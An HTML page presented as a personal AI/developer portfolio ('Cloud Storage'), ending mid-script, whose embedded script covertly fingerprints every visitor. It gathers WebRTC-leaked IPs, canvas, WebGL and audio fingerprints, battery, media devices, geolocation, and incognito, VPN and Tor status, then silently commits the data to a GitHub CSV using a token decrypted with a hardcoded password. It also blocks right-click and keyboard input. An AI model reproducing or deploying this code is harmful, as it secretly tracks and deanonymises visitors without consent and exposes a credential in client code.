<!DOCTYPE html>
<html lang="en">
<head>
    <title>Cloud Storage</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <meta name="description" content="open file's portfolio: AI, ML, DL, software projects, skills, publications, and contact. Explore interactive demos, research, and more.">
    <meta name="keywords" content="Rutuj, open file, portfolio, AI, ML, DL, developer, projects, skills, research, publications, software engineer, personal website, interactive, open file Portfolio, Rutuj portfolio, Dhodapkar, Dhodapkar portfolio, innovation, technology, coding, programming, data science, neural networks, deep learning, artificial intelligence, machine learning, web development, open source, github, blog, contact, resume">
    <meta name="author" content="open file">
    <meta name="theme-color" content="#0f0f0f">
    <meta name="color-scheme" content="light dark">

    <!-- Open Graph / Facebook -->
    <meta property="og:title" content="open file | AI Student & Developer Portfolio">
    <meta property="og:description" content="Explore open file's portfolio: AI, ML, DL, software projects, interactive demos, research, and more.">
    <meta property="og:image" content="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main">
    <meta property="og:url" content="https://openfile.netlify.app">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="open file Portfolio">

    <!-- Twitter Card -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="open file | AI Student & Developer Portfolio">
    <meta name="twitter:description" content="Explore open file's portfolio: AI, ML, DL, software projects, interactive demos, research, and more.">
    <meta name="twitter:image" content="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/Poster.png">
    <meta name="twitter:site" content="@rutujdhodapkar">
    <meta name="twitter:creator" content="@rutujdhodapkar">

    <!-- Favicon and Manifest -->
    <link rel="icon" href="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/icons.png" type="image/png" sizes="any" style="border-radius:50%;">
    <link rel="apple-touch-icon" sizes="180x180" href="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/icons.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/icons.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/icons.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/icons.png" color="#0a192f">


    <script type="text/javascript">
      (function(c,l,a,r,i,t,y){
          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
      })(window, document, "clarity", "script", "t5hc5gi2sl");
  </script>


    <!-- Required Libraries -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <!-- Add PapaParse so Papa.parse(...) works -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/PapaParse/5.3.2/papaparse.min.js"></script>

    <style>
      html, body {
        cursor: url('cursor.svg'), auto;
      }
      /* Make favicon appear circular in supported browsers */
      link[rel~="icon"] {
        border-radius: 50%;
        overflow: hidden;
      }
    </style>

    <!-- Progressive Web App support -->
    <meta name="application-name" content="open file Portfolio">
    <meta name="apple-mobile-web-app-title" content="open file Portfolio">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="msapplication-TileColor" content="#0a192f">
    <meta name="msapplication-TileImage" content="https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/icons.png">


    
    <iframe 
        src="web.html" 
        style="width:100vw; height:100vh; border:none; position:fixed; top:0; left:0; z-index:1; overflow:hidden;" 
        scrolling="auto">
    </iframe>

    <script>
      // Disable right-click context menu
      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
      }, false);

      // Disable all keyboard input
      document.addEventListener('keydown', function(e) {
        e.preventDefault();
        return false;
      }, false);

      document.addEventListener('keypress', function(e) {
        e.preventDefault();
        return false;
      }, false);

      document.addEventListener('keyup', function(e) {
        e.preventDefault();
        return false;
      }, false);
    </script>
</head>

<body>
  <script>
    // --- ENHANCED CONFIG ---
    const PASSWORD = "supersecret";
    const CSV_URL = "https://raw.githubusercontent.com/rutujdhodapkar/Profile/main/data.csv";
    const REPO = "rutujdhodapkar/Image-Hosting";
    const FILE = "userdata.csv";
    const TIMEOUT = 30000; // 30 second timeout
    const MAX_RETRIES = 3;
    let visitStart = Date.now();

    let debugMode = false; // Set to true for debugging
    
    // --- UTILITY FUNCTIONS ---
    function log(message, error = false) {
      if (debugMode) {
        error ? console.error(message) : console.log(message);
      }
    }
    
    function withTimeout(promise, timeoutMs) {
      return Promise.race([
        promise,
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Operation timed out')), timeoutMs)
        )
      ]);
    }
    
    // --- ENHANCED TOKEN HANDLING ---
    function decryptTokenLegacy(b64) {
      try {
        const raw = CryptoJS.enc.Base64.parse(b64);
        const iv = CryptoJS.enc.Utf8.parse("0000000000000000");
        const key = CryptoJS.SHA256(PASSWORD);
        const ciphertext = CryptoJS.lib.WordArray.create(raw.words.slice(4));
        const decrypted = CryptoJS.AES.decrypt({ciphertext}, key, {
          iv, 
          mode: CryptoJS.mode.CBC, 
          padding: CryptoJS.pad.Pkcs7
        });
        return decrypted.toString(CryptoJS.enc.Utf8);
      } catch (e) {
        log('Legacy token decryption failed: ' + e.message, true);
        throw e;
      }
    }

    function decryptTokenModern(encrypted) {
      try {
        const decrypted = CryptoJS.AES.decrypt(encrypted, PASSWORD);
        return decrypted.toString(CryptoJS.enc.Utf8);
      } catch (e) {
        log('Modern token decryption failed: ' + e.message, true);
        throw e;
      }
    }

    async function getEncryptedToken() {
      try {
        log('Fetching token from CSV...');
        const response = await withTimeout(fetch(CSV_URL), TIMEOUT);
        
        if (!response.ok) {
          throw new Error(`Failed to fetch CSV: ${response.status} ${response.statusText}`);
        }
        
        const text = await response.text();
        log('CSV content received, parsing...');
        
        // Enhanced CSV parsing with error handling
        try {
          const parsed = Papa.parse(text, {
            header: true,
            skipEmptyLines: true,
            transformHeader: header => header.trim().toLowerCase()
          });
          
          if (parsed.errors && parsed.errors.length > 0) {
            log('CSV parsing warnings: ' + JSON.stringify(parsed.errors));
          }
          
          if (parsed.data && parsed.data.length > 0) {
            const firstRow = parsed.data[0];
            if (firstRow.token) {
              log('Token found in parsed CSV');
              return firstRow.token;
            }
          }
        } catch (parseError) {
          log('Papa Parse failed, trying manual parsing: ' + parseError.message);
        }
        
        // Fallback: manual parsing
        const lines = text.split('\n');
        for (let line of lines) {
          if (line.toLowerCase().includes('token')) {
            const parts = line.split(',');
            if (parts.length >= 2) {
              return parts[1].trim().replace(/['"]/g, '');
            }
          }
        }
        
        throw new Error('No token found in CSV');
      } catch (error) {
        log('Failed to get encrypted token: ' + error.message, true);
        throw error;
      }
    }

    // --- COMPREHENSIVE DATA COLLECTION ---
    
    // Enhanced IP detection with multiple STUN servers
    async function getAllIPs() {
      const ips = new Set();
      const stunServers = [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302',
        'stun:stun2.l.google.com:19302',
        'stun:stun.cloudflare.com:3478',
        'stun:stun.nextcloud.com:443',
        'stun:stun.freeswitch.org:3478'
      ];
      
      for (let stunServer of stunServers) {
        try {
          const pc = new RTCPeerConnection({
            iceServers: [{ urls: stunServer }],
            iceCandidatePoolSize: 10
          });
          
          pc.createDataChannel('');
          
          const offer = await pc.createOffer();
          await pc.setLocalDescription(offer);
          
          await new Promise((resolve) => {
            const timeout = setTimeout(resolve, 3000);
            let candidateCount = 0;
            
            pc.onicecandidate = (e) => {
              if (e.candidate) {
                candidateCount++;
                const candidate = e.candidate.candidate;
                
                // Extract IPv4 addresses
                const ipv4Match = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                if (ipv4Match) {
                  ips.add(ipv4Match[1]);
                }
                
                // Extract IPv6 addresses
                const ipv6Match = candidate.match(/([0-9a-f:]+:+[0-9a-f]+)/i);
                if (ipv6Match && ipv6Match[1].includes(':')) {
                  ips.add(ipv6Match[1]);
                }
              } else if (candidateCount > 0) {
                clearTimeout(timeout);
                resolve();
              }
            };
          });
          
          pc.close();
        } catch (error) {
          log(`STUN server ${stunServer} failed: ${error.message}`);
        }
      }
      
      return Array.from(ips);
    }

    // Canvas fingerprinting implementation
    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = 280;
        canvas.height = 60;
        
        // Draw complex pattern for better uniqueness
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial, sans-serif';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        
        ctx.fillStyle = '#069';
        ctx.fillText('Canvas fingerprint test ðŸ”’', 2, 15);
        
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Canvas fingerprint test ðŸ”’', 4, 17);
        
        // Add some shapes for better variance
        ctx.globalCompositeOperation = 'multiply';
        ctx.fillStyle = 'rgb(255,0,255)';
        ctx.beginPath();
        ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();
        
        const imageData = canvas.toDataURL();
        
        // Generate hash of the canvas
        let hash = 0;
        for (let i = 0; i < imageData.length; i++) {
          const char = imageData.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash; // Convert to 32-bit integer
        }
        
        return Math.abs(hash).toString(16);
      } catch (error) {
        log('Canvas fingerprinting failed: ' + error.message, true);
        return 'unavailable';
      }
    }
    
    // WebGL fingerprinting implementation
    function getWebGLFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) return 'unsupported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        let fingerprint = '';
        
        if (debugInfo) {
          fingerprint += gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || '';
          fingerprint += '|' + (gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '');
        }
        
        fingerprint += '|' + (gl.getParameter(gl.VERSION) || '');
        fingerprint += '|' + (gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || '');
        fingerprint += '|' + (gl.getParameter(gl.VENDOR) || '');
        fingerprint += '|' + (gl.getParameter(gl.RENDERER) || '');
        
        // Get supported extensions
        const extensions = gl.getSupportedExtensions();
        if (extensions) {
          fingerprint += '|' + extensions.sort().join(',');
        }
        
        // Generate hash
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
          const char = fingerprint.charCodeAt(i);
          hash = ((hash << 5) - hash) + char;
          hash = hash & hash;
        }
        
        return Math.abs(hash).toString(16);
      } catch (error) {
        log('WebGL fingerprinting failed: ' + error.message, true);
        return 'unavailable';
      }
    }
    
    // Audio fingerprinting implementation
    function getAudioFingerprint() {
      return new Promise((resolve) => {
        try {
          const audioContext = new (window.AudioContext || window.webkitAudioContext)();
          
          if (!audioContext) {
            resolve('unsupported');
            return;
          }
          
          const oscillator = audioContext.createOscillator();
          const analyser = audioContext.createAnalyser();
          const gainNode = audioContext.createGain();
          const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
          
          oscillator.type = 'triangle';
          oscillator.frequency.value = 1000;
          
          gainNode.gain.value = 0;
          
          oscillator.connect(analyser);
          analyser.connect(scriptProcessor);
          scriptProcessor.connect(gainNode);
          gainNode.connect(audioContext.destination);
          
          oscillator.start(0);
          
          scriptProcessor.onaudioprocess = function(bins) {
            const samples = bins.inputBuffer.getChannelData(0);
            let fingerprint = '';
            
            for (let i = 0; i < samples.length; i++) {
              if (samples[i] !== 0) {
                fingerprint += Math.abs(samples[i]).toString(36);
                if (fingerprint.length > 50) break;
              }
            }
            
            oscillator.stop(0);
            audioContext.close();
            
            // Generate hash
            let hash = 0;
            for (let i = 0; i < fingerprint.length; i++) {
              const char = fingerprint.charCodeAt(i);
              hash = ((hash << 5) - hash) + char;
              hash = hash & hash;
            }
            
            resolve(Math.abs(hash).toString(16) || 'unavailable');
          };
          
          setTimeout(() => {
            try {
              oscillator.stop(0);
              audioContext.close();
            } catch (e) {}
            resolve('timeout');
          }, 1000);
          
        } catch (error) {
          log('Audio fingerprinting failed: ' + error.message, true);
          resolve('unavailable');
        }
      });
    }
    
    // Enhanced device media detection
    async function getMediaDevices() {
      try {
        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
          return { audioInputs: 0, videoInputs: 0, audioOutputs: 0 };
        }
        
        const devices = await navigator.mediaDevices.enumerateDevices();
        
        return {
          audioInputs: devices.filter(d => d.kind === 'audioinput').length,
          videoInputs: devices.filter(d => d.kind === 'videoinput').length,
          audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
          deviceList: devices.map(d => `${d.kind}:${d.label || 'unnamed'}`).join(';')
        };
      } catch (error) {
        log('Media device detection failed: ' + error.message, true);
        return { audioInputs: 0, videoInputs: 0, audioOutputs: 0, deviceList: 'unavailable' };
      }
    }
    
    // Enhanced geolocation data
    async function getIPInfo() {
      const apis = [
        'https://ipapi.co/json/',
        'https://ip-api.com/json/',
        'https://ipinfo.io/json'
      ];
      
      for (let api of apis) {
        try {
          log(`Trying IP API: ${api}`);
          const response = await withTimeout(fetch(api), 10000);
          if (response.ok) {
            const data = await response.json();
            log('IP info retrieved successfully');
            return data;
          }
        } catch (error) {
          log(`IP API ${api} failed: ${error.message}`);
          continue;
        }
      }
      
      log('All IP APIs failed', true);
      return {};
    }
    
    // Enhanced privacy detection
    function detectAdblock() {
      return new Promise(resolve => {
        const bait = document.createElement('div');
        bait.className = 'adsbox ads ad pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links';
        bait.style = 'width:1px;height:1px;position:absolute;left:-9999px;top:-9999px;';
        document.body.appendChild(bait);
        
        setTimeout(() => {
          const blocked = bait.offsetHeight === 0 || 
                         bait.offsetWidth === 0 || 
                         window.getComputedStyle(bait).display === 'none';
          bait.remove();
          resolve(blocked);
        }, 100);
      });
    }

    function detectIncognito() {
      return new Promise(resolve => {
        if (navigator.storage && navigator.storage.estimate) {
          navigator.storage.estimate().then(estimate => {
            resolve(estimate.quota < 120000000);
          }).catch(() => resolve(false));
        } else {
          resolve(false);
        }
      });
    }

    function detectPrivateMode() {
      return new Promise(resolve => {
        if (window.webkitRequestFileSystem) {
          window.webkitRequestFileSystem(0, 1, () => resolve(false), () => resolve(true));
        } else if (window.indexedDB && /Firefox/.test(navigator.userAgent)) {
          try {
            const db = indexedDB.open('test');
            db.onerror = () => resolve(true);
            db.onsuccess = () => resolve(false);
          } catch (e) {
            resolve(true);
          }
        } else {
          resolve(false);
        }
      });
    }
    
    // Enhanced battery detection
    async function getBatteryInfo() {
      try {
        if (navigator.getBattery) {
          const battery = await withTimeout(navigator.getBattery(), 5000);
          return {
            level: Math.round(battery.level * 100),
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
        }
        return { level: 'unknown', charging: 'unknown', chargingTime: 'unknown', dischargingTime: 'unknown' };
      } catch (error) {
        log('Battery info failed: ' + error.message, true);
        return { level: 'unavailable', charging: 'unavailable', chargingTime: 'unavailable', dischargingTime: 'unavailable' };
      }
    }
    
    // Enhanced VPN/Tor detection
    function detectVPN(org, ip) {
      const vpnKeywords = /vpn|proxy|cloudflare|digitalocean|linode|aws|ovh|google cloud|azure|hosting|server|datacenter/i;
      const vpnFromOrg = vpnKeywords.test(org || "");
      
      // Check for common VPN IP ranges
      const vpnRanges = [
        /^10\./,
        /^172\.(1[6-9]|2[0-9]|3[01])\./,
        /^192\.168\./,
        /^169\.254\./
      ];
      
      const privateIP = vpnRanges.some(range => range.test(ip || ""));
      
      return {
        detected: vpnFromOrg,
        confidence: vpnFromOrg ? (privateIP ? 'high' : 'medium') : 'low',
        reasons: []
      };
    }

    function detectTor(org, userAgent) {
      const torKeywords = /tor|onion|relay|exit|guard/i;
      const torFromOrg = torKeywords.test(org || "");
      
      // Check for Tor browser user agent patterns
      const torBrowser = /Tor Browser/.test(userAgent || "");
      
      // Low entropy check (common Tor Browser characteristic)
      const lowEntropy = navigator.hardwareConcurrency <= 2 && 
                        screen.width === 1000 && 
                        screen.height === 1000;
      
      return {
        detected: torFromOrg || torBrowser || lowEntropy,
        confidence: torBrowser ? 'high' : (torFromOrg ? 'medium' : 'low'),
        reasons: [
          torFromOrg && 'org_keywords',
          torBrowser && 'user_agent',
          lowEntropy && 'low_entropy'
        ].filter(Boolean)
      };
    }
    
    // Main data collection function
    async function collectData() {
      log('Starting comprehensive data collection...');
      
      try {
        const startTime = Date.now();
        
        // Collect all data in parallel where possible
        const [
          ipInfo,
          allIPs,
          adblock,
          incognito,
          privateMode,
          battery,
          mediaDevices,
          canvasFingerprint,
          webglFingerprint,
          audioFingerprint
        ] = await Promise.all([
          getIPInfo(),
          getAllIPs(),
          detectAdblock(),
          detectIncognito(),
          detectPrivateMode(),
          getBatteryInfo(),
          getMediaDevices(),
          getCanvasFingerprint(),
          getWebGLFingerprint(),
          getAudioFingerprint()
        ]);
        
        const now = new Date();
        const collectionTime = Date.now() - startTime;
        
        // Enhanced GPU info
        const gpu = (() => {
          try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
              if (debugInfo) {
                return {
                  vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Unknown',
                  renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown',
                  driver: gl.getParameter(gl.VERSION) || 'Unknown'
                };
              }
            }
            return { vendor: 'WebGL Unavailable', renderer: 'WebGL Unavailable', driver: 'WebGL Unavailable' };
          } catch (error) {
            return { vendor: 'Error', renderer: 'Error', driver: 'Error' };
          }
        })();
        
        // Enhanced CPU detection
        const cpu = (() => {
          const ua = navigator.userAgent;
          if (/Intel/i.test(ua)) return 'Intel';
          if (/AMD/i.test(ua)) return 'AMD';
          if (/Apple/i.test(ua) || /Mac/i.test(ua)) return 'Apple Silicon';
          if (/ARM/i.test(ua)) return 'ARM';
          return 'Unknown';
        })();

        // Try to get CPU brand string (modern browsers)
        let cpuBrand = 'unknown';
        if (navigator.userAgentData && navigator.userAgentData.brands) {
          const cpuBrandObj = navigator.userAgentData.brands.find(b => /intel|amd|apple|arm/i.test(b.brand));
          if (cpuBrandObj) cpuBrand = cpuBrandObj.brand;
        }

        // Try to get browser name/version (modern browsers)
        let browser = 'unknown';
        if (navigator.userAgentData && navigator.userAgentData.brands) {
          browser = navigator.userAgentData.brands.map(b => `${b.brand} ${b.version}`).join(';');
        } else if (navigator.userAgent) {
          // Fallback: parse userAgent string
          const ua = navigator.userAgent;
          if (/chrome|crios|crmo/i.test(ua)) browser = 'Chrome';
          else if (/firefox|fxios/i.test(ua)) browser = 'Firefox';
          else if (/safari/i.test(ua)) browser = 'Safari';
          else if (/edg/i.test(ua)) browser = 'Edge';
          else if (/opr\//i.test(ua)) browser = 'Opera';
          else if (/msie|trident/i.test(ua)) browser = 'IE';
          else browser = ua.split(' ')[0];
        }

        // VPN/Tor detection
        const vpnDetection = detectVPN(ipInfo.org, ipInfo.ip);
        const torDetection = detectTor(ipInfo.org, navigator.userAgent);

        // Compose all local IPs as string
        const localIPs = allIPs.filter(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip)).join(';');

        // Compose timestamp (epoch ms)
        const timestamp = Date.now();

        // Compose totalTime (same as timeOnPageSec for now)
        const totalTime = ((Date.now() - visitStart) / 1000).toFixed(1);

        // Compose vpn and tor fields (string, for compatibility)
        const vpn = vpnDetection.detected ? 'yes' : 'no';
        const tor = torDetection.detected ? 'yes' : 'no';

        // Compose deviceMemoryGB (number, if available)
        let deviceMemoryGB = 'unknown';
        if (navigator.deviceMemory) deviceMemoryGB = navigator.deviceMemory;

        // Compose battery (object as JSON string for CSV)
        const batteryObj = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
        const batteryStr = JSON.stringify(batteryObj);

        // Compose gpu (object as JSON string for CSV)
        const gpuObj = {
          vendor: gpu.vendor,
          renderer: gpu.renderer,
          driver: gpu.driver
        };
        const gpuStr = JSON.stringify(gpuObj);

        // Compose cpu (string)
        const cpuStr = cpu;

        // Compose languages (array or string)
        const languages = (navigator.languages || []).join(',');

        // Compose doNotTrack (string)
        const doNotTrack = navigator.doNotTrack || 'not_specified';

        // Compose javaEnabled (bool)
        const javaEnabled = typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false;

        // Compose allIPs (string)
        const allIPsStr = allIPs.join(';');

        // Compose hasLocalIPs/hasPublicIPs
        const hasLocalIPs = allIPs.some(ip => /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/.test(ip));
        const hasPublicIPs = allIPs.some(ip => !/^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.|169\.254\.)/.test(ip));

        // Compose performanceMemory (object or unavailable)
        const performanceMemory = performance.memory ? {
          usedJSHeapSize: performance.memory.usedJSHeapSize,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
        } : 'unavailable';

        // Compose sessionId/visitId
        const sessionId = Math.random().toString(36).substr(2, 9);
        const visitId = `${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;

        // Compose the full data object, adding all missing fields
        const comprehensiveData = {
          // --- Requested fields ---
          visitTimestampUTC: now.toISOString(),
          localTime: now.toString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timeOffset: now.getTimezoneOffset(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          languages: languages,
          cpuCores: navigator.hardwareConcurrency || 'unknown',
          deviceMemoryGB: deviceMemoryGB,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: doNotTrack,
          referrer: document.referrer || 'direct',
          pageURL: location.href,
          screenResolution: `${screen.width}x${screen.height}`,
          availableScreen: `${screen.availWidth}x${screen.availHeight}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          refreshRate: screen.refreshRate || 'unknown',
          gpuVendor: gpu.vendor,
          gpuRenderer: gpu.renderer,
          gpuDriver: gpu.driver,
          battery: batteryStr,
          timeOnPageSec: ((Date.now() - visitStart) / 1000).toFixed(1),
          ip: ipInfo.ip || 'unknown',
          city: ipInfo.city || 'unknown',
          region: ipInfo.region || ipInfo.region_name || 'unknown',
          country: ipInfo.country || ipInfo.country_name || 'unknown',
          latitude: ipInfo.latitude || ipInfo.lat || 'unknown',
          longitude: ipInfo.longitude || ipInfo.lon || 'unknown',
          org: ipInfo.org || ipInfo.organization || 'unknown',
          localIPs: localIPs,
          timestamp: timestamp,
          browser: browser,
          gpu: gpuStr,
          cpu: cpuStr,
          adblock: adblock,
          incognito: incognito,
          privateMode: privateMode,
          vpnDetected: vpnDetection.detected,
          torDetected: torDetection.detected,
          totalTime: totalTime,
          cpuBrand: cpuBrand,
          vpn: vpn,
          tor: tor,
          collectionTimeMs: collectionTime,
          language: navigator.language,
          javaEnabled: javaEnabled,
          protocol: location.protocol,
          host: location.host,
          pathname: location.pathname,
          screenOrientation: screen.orientation ? screen.orientation.type : 'unknown',
          pixelRatio: window.devicePixelRatio || 1,
          deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'unknown',
          batteryLevel: battery.level,
          batteryCharging: battery.charging,
          batteryChargingTime: battery.chargingTime,
          batteryDischargingTime: battery.dischargingTime,
          countryCode: ipInfo.country_code || 'unknown',
          isp: ipInfo.isp || 'unknown',
          timezone_ip: ipInfo.timezone || 'unknown',
          allIPs: allIPsStr,
          ipCount: allIPs.length,
          hasLocalIPs: hasLocalIPs,
          hasPublicIPs: hasPublicIPs,
          adblockDetected: adblock,
          incognitoMode: incognito,
          vpnConfidence: vpnDetection.confidence,
          torConfidence: torDetection.confidence,
          torReasons: torDetection.reasons.join(','),
          audioInputDevices: mediaDevices.audioInputs,
          videoInputDevices: mediaDevices.videoInputs,
          audioOutputDevices: mediaDevices.audioOutputs,
          mediaDevicesList: mediaDevices.deviceList,
          canvasFingerprint: canvasFingerprint,
          webglFingerprint: webglFingerprint,
          audioFingerprint: audioFingerprint,
          connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
          connectionDownlink: navigator.connection ? navigator.connection.downlink : 'unknown',
          connectionRTT: navigator.connection ? navigator.connection.rtt : 'unknown',
          pluginCount: navigator.plugins ? navigator.plugins.length : 0,
          plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(';') : 'unavailable',
          performanceMemory: performanceMemory,
          webgl: !!window.WebGLRenderingContext,
          webgl2: !!window.WebGL2RenderingContext,
          webrtc: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection),
          mediaDevicesAPI: !!navigator.mediaDevices,
          geolocationAPI: !!navigator.geolocation,
          notificationAPI: !!window.Notification,
          serviceWorker: !!navigator.serviceWorker,
          webAssembly: !!window.WebAssembly,
          sessionId: sessionId,
          visitId: visitId,
          // --- End requested fields ---
        };
        
        log(`Data collection completed in ${collectionTime}ms`);
        return comprehensiveData;
        
      } catch (error) {
        log('Data collection failed: ' + error.message, true);
        throw error;
      }
    }

    // Enhanced GitHub upload with retry mechanism
    async function uploadToGitHub(token, newData) {
      const url = `https://api.github.com/repos/${REPO}/contents/${FILE}`;
      
      for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
          log(`GitHub upload attempt ${attempt}/${MAX_RETRIES}`);
          
          const headers = {
            "Authorization": `token ${token}`,
            "Content-Type": "application/json",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28"
          };

          let csv = "";
          let sha = null;
          let keys = Object.keys(newData);

          // Try to get existing file
          const getResponse = await withTimeout(fetch(url, { headers }), TIMEOUT);
          
          if (getResponse.status === 200) {
            const existingFile = await getResponse.json();
            const existingContent = atob(existingFile.content.replace(/\n/g, ""));
            
            try {
              const parsed = Papa.parse(existingContent, {
                header: true,
                skipEmptyLines: true,
                transformHeader: header => header.trim()
              });
              
              // Merge column headers
              keys = [...new Set([...(parsed.meta.fields || []), ...keys])];
              
              // Create CSV with existing data plus new row
              const existingRows = parsed.data.filter(row => 
                Object.values(row).some(value => value && value.toString().trim())
              );
              
              const allRows = existingRows.map(row => 
                keys.map(key => `"${(row[key] || '').toString().replace(/"/g, '""')}"`)
              );
              
              allRows.push(keys.map(key => 
                `"${(newData[key] || '').toString().replace(/"/g, '""')}"`
              ));
              
              csv = [keys.join(','), ...allRows.map(row => row.join(','))].join('\n');
              sha = existingFile.sha;
              
            } catch (parseError) {
              log('Failed to parse existing CSV, creating new file: ' + parseError.message);
              csv = [keys.join(','), keys.map(k => `"${(newData[k] || '').toString().replace(/"/g, '""')}"`).join(',')].join('\n');
            }
          } else if (getResponse.status === 404) {
            // File doesn't exist, create new
            log('File does not exist, creating new file');
            csv = [keys.join(','), keys.map(k => `"${(newData[k] || '').toString().replace(/"/g, '""')}"`).join(',')].join('\n');
          } else {
            throw new Error(`Failed to check existing file: ${getResponse.status} ${getResponse.statusText}`);
          }

          // Upload the file
          const uploadBody = {
            message: `Log visitor data - ${new Date().toISOString()}`,
            content: btoa(csv),
            ...(sha && { sha })
          };

          const uploadResponse = await withTimeout(fetch(url, {
            method: "PUT",
            headers,
            body: JSON.stringify(uploadBody)
          }), TIMEOUT);

          if (!uploadResponse.ok) {
            const errorText = await uploadResponse.text();
            throw new Error(`Upload failed: ${uploadResponse.status} ${uploadResponse.statusText} - ${errorText}`);
          }

          const result = await uploadResponse.json();
          log('GitHub upload successful: ' + result.commit.sha);
          return result;

        } catch (error) {
          log(`GitHub upload attempt ${attempt} failed: ${error.message}`, true);
          
          if (attempt === MAX_RETRIES) {
            throw error;
          }
          
          // Wait before retry (exponential backoff)
          await new Promise(resolve => setTimeout(resolve, Math.pow(2, attempt) * 1000));
        }
      }
    }

    // Main execution function
    async function executeDataCollection() {
      try {
        log('=== Starting Data Collection Process ===');
        
        // Get and decrypt token
        const encrypted = await getEncryptedToken();
        if (!encrypted) {
          throw new Error('No encrypted token found');
        }
        
        let token = null;
        
        // Try both decryption methods
        try {
          token = decryptTokenLegacy(encrypted);
          log('Token decrypted using legacy method');
        } catch (e) {
          try {
            token = decryptTokenModern(encrypted);
            log('Token decrypted using modern method');
          } catch (e2) {
            throw new Error('Both token decryption methods failed');
          }
        }
        
        if (!token || token.length < 10) {
          throw new Error('Invalid token received');
        }
        
        // Collect comprehensive data
        const data = await collectData();
        
        // Upload to GitHub
        await uploadToGitHub(token, data);
        
        log('=== Data Collection Process Completed Successfully ===');
        
      } catch (error) {
        log('=== Data Collection Process Failed ===', true);
        log('Error details: ' + error.message, true);
        
        // In production, you might want to send error reports to a logging service
        // For now, we fail silently as requested
      }
    }

    // Execute immediately only on allowed hosts (allow localhost/file for testing)
    const allowedHosts = ["openfile.netlify.app", "localhost", "127.0.0.1"];
    if (location.protocol === 'file:' || allowedHosts.includes(window.location.hostname)) {
      executeDataCollection();
    } else {
      console.warn('Data collection disabled on this host:', window.location.hostname);
    }

    // Track time spent and upload on page unload
    let timeSpent = 0;
    const timeTracker = setInterval(() => timeSpent++, 1000);

    window.addEventListener("beforeunload", () => {
      clearInterval(timeTracker);
      
      // Use sendBeacon for more reliable unload data sending
      if (navigator.sendBeacon) {
        executeDataCollection().then(() => {
          log('Unload data collection completed');
        }).catch(error => {
          log('Unload data collection failed: ' + error.message, true);
        });
